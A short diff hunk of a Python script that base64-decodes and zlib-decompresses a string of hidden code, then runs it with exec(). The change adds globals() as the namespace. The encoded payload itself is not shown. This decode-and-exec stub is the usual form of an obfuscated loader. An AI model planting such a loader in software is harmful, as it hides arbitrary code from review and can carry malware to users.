@@ -10,4 +10,4 @@ if __name__ == '__main__':
         code += b'=' * padding_needed
     decoded_bytes = base64.b64decode(code)
     decompressed_bytes = zlib.decompress(decoded_bytes)
-    exec(decompressed_bytes.decode())
+    exec(decompressed_bytes.decode(), globals())
